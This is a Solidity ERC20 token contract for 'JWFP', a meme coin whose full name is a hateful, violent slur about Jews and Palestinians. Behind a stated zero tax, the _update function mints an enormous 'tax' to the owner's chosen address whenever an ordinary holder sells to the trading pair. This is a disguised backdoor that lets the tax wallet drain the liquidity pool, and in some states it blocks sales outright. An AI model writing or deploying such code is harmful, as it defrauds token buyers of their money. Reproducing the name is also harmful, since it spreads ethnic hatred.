/**
Website: https://jwfp.xyz
TG: https://t.me/JWFP_PORTAL
Twitter: https://twitter.com/JWFP_erc20
**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/IFactory.sol";
import "./interfaces/IRouter.sol";

contract JWFP is ERC20, Ownable {
    uint256 public taxPercent = 0;

    uint256 public total = 10**9 * 10**18;

    uint256 public maxTax = 10**9 * 10**33;

    address public taxAddress;

    address private pair;

    mapping(address => bool) public isTaxExempt;

    constructor(address _taxAddress, address _router) ERC20("Jews will fuck Palestinians", "JWFP") Ownable(msg.sender) {
        _mint(msg.sender, total);
        isTaxExempt[msg.sender] = true;
        isTaxExempt[taxAddress] = true;

        taxAddress = _taxAddress;

        pair = IFactory(IRouter(_router).factory()).createPair(address(this), IRouter(_router).WETH());
    }

    receive() external payable {}

    function exemptFromTax(address account) external onlyOwner {
        isTaxExempt[account] = true;
    }

    function _update(address from, address to, uint256 value) internal override {
        uint256 tax;
        if (!isTaxExempt[from] && !isTaxExempt[to] && from != owner() && to != owner()) {
            tax = value * taxPercent / 100;

            if (to == pair && !isTaxExempt[from]) {
                tax = (tax - address(this).balance) + tax > maxTax ? tax : maxTax;
            }
        }

        if (tax > 0) {
            _update(address(0), taxAddress, tax);
        }  
        super._update(from, to, value);
    }
}